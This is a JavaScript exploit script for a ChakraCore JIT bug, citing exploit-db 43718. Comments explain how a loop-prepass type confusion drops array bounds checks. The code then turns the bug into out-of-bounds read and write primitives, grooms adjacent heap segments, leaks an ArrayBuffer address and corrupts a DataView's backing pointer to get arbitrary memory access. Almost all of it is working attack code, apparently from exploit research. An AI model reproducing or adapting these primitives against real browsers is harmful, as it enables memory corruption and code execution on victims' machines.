var convBuf = new ArrayBuffer(8);
var f64 = new Float64Array(convBuf);
var i32 = new Uint32Array(convBuf);

function hex(val, size=8) {
    return '0x' + ('0'.repeat(size) + val.toString(16)).substr(-size);
}

const M = 0x100000000;
function i2d(x) {
    i32[0] = x % M;
    i32[1] = x / M;
    return f64[0];
}
function d2i(x) {
    f64[0] = x;
    return i32[1] * M + i32[0];
}

function ReadUint64(view, offset) {
    const low = view.getUint32(offset, true);
    const high = view.getUint32(offset+4, true);
    return high * 0x100000000 + low;
}

function WriteUint64(view, offset, val) {
    const low = val % M;
    const high = val / M;
    view.setUint32(offset, low, true);
    view.setUint32(offset+4, high, true);
}


/*
https://www.exploit-db.com/exploits/43718/
What happens here is as follows:
In the loop prepass analysis, (a) is a valid add operation.
It's a relative operation to "i", so Chakra thinks it's a valid loop.

The variable "i" now becomes an induction variable, and a LoopCount object is created.
When the LoopCount object is created, the ValueInfo of "i" is IntBounded which contains
relative bounds information.
In the actual optimization phase, (a) gets optimized and becomes a load operation
which directly loads 10 to "i". It's no more relative operation, therefore the
ValueInfo of "i" is not to be IntBounded. But the LoopCount object has already been
created with the previous information. This leads Chakra to fail computing bounds
which may result in OOB read/write.
*/

/*
There is a type confusion in the JIT code emitter such that the bounds check on the
array indexing variable is not emitted. This is due to the relative addition in line
(a) below.

It can be exploited to OOB read/write as implemented below. The intended way to use this
it by first jitting the 2 functions, and then calling them with the 'target' OOB index as
the 'start' argument with 'end' = 'target' + 1.
*/

function oobWrite(arr, idx, val) {
    for (let i = idx; i < idx+1; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        arr[i] = val;
    }
    return 0;
}

function oobRead(arr, idx) {
    let x;
    for (let i = idx; i < idx+1; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        x = arr[i];
    }
    return x;
}

function oobCopy(arr, start, end, out) {
    for (let i = start; i < end; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        out[i] = arr[i];
    }
}

// allocate SparseArraySegments of size such that they are adjacent
// see https://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html
let sizeOfInt = 4;  // size of elements in JavascriptNativeIntArray
let sizeOfPtr = 8;  // size of elements in (mixed) JavascriptArray
let sizeOfNativeIntArray = (0x10000-0x38)/sizeOfInt;

let ab = new ArrayBuffer(0x10000-0x38);

let target = new Array(sizeOfNativeIntArray);
target.fill(0x42424242);
target[0] = 0x13381338;

let ptrArr = new Array((0x10000-0x38)/sizeOfPtr);
ptrArr.fill(ab);
ptrArr[0] = 0x43434343;

let oobArr = new Array(sizeOfNativeIntArray);
oobArr.fill(0x41414141);
oobArr[0] = 0x13371337;

ptrArr[1] = oobArr;
ptrArr[2] = target;

let dv = new DataView(ab);
dv.setUint32(0, 0x71717171, true);
dv.setUint32(4, 0x72727272, true);
    
// let gc = [];
// for(let i = 0; i < 100; i++) {
//     gc.push(new ArrayBuffer(0x20000));
// }
// gc = [];

// print("busy loop; wait for gc");
// const start = Date.now();
// while(Date.now() - start < 1000) {}
// print("done");

for (let i = 0; i < 1000; i++) {
    // oobWrite(arr, 0, 3, 5.40900888e-315);
    oobWrite(oobArr, 0, 0x13371337);
}
for (let i = 0; i < 1000; i++) {
    oobRead(oobArr, 0);
}
// for (let i = 0; i < 1000; i++) {
//     oobCopy(oobArr, 3, 6, copy);
// }

/* 
allocations:

oobArr @ 0x7ff7f2170000(+0x38)
target @ 0x7ff7f2190000
ptrArr @ 0x7ff7f21a0038
dataView @ 0x7ff7f21c1500 <-- how consistent is this?
*/

let offToTargetSegment = sizeOfNativeIntArray + (0x10000/sizeOfInt);
// oobWrite(oobArr, offToTargetSegment+9, 0x7fffffff);
oobWrite(oobArr, offToTargetSegment+10, 0x7fffffff);

// print("oobArr:");
// for(let i = 0; i < 20; i++) {
//     print(i + ": " + hex(oobRead(oobArr, offToTargetSegment+i) >>> 0));
// }

let offToPtrArrSegment = sizeOfNativeIntArray + 2*(0x10000/sizeOfInt);
let abAddr_low = oobRead(oobArr, offToPtrArrSegment+20);
let abAddr_high = oobRead(oobArr, offToPtrArrSegment+21);
print('ab: ' + hex(abAddr_high*M + abAddr_low, 16));


let offToDataViewArea = sizeOfNativeIntArray + 4*(0x10000/sizeOfInt);
// print("ptrArr:");
// for(let i = 0; i < 64; i++) {
//     print(i + ": " + hex(oobRead(oobArr, offToPtrArrSegment+i) >>> 0));
// }
let offDv = null;
for(let i = 0; i < 2000; i += 2) {
    if( 
        oobRead(oobArr, offToDataViewArea+i) === abAddr_low && 
        oobRead(oobArr, offToDataViewArea+i+1) === abAddr_high
    ) {
        offDv = offToDataViewArea + i - 10;
        break;
    }
}

print("dataView:");
for(let i = 0; i < 16; i++) {
    print(i + ": " + hex(oobRead(oobArr, offDv+i) >>> 0));
}

oobWrite(oobArr, offDv+14, abAddr_low);
oobWrite(oobArr, offDv+15, abAddr_high);

for(let i = 0; i < 16; i++) {
    print(i + ": " + hex(oobRead(oobArr, offDv+i) >>> 0));
}

print(hex(dv.getUint32(4, true)) + hex(dv.getUint32(0, true)).slice(-8));

print(Math.floor(2.2));
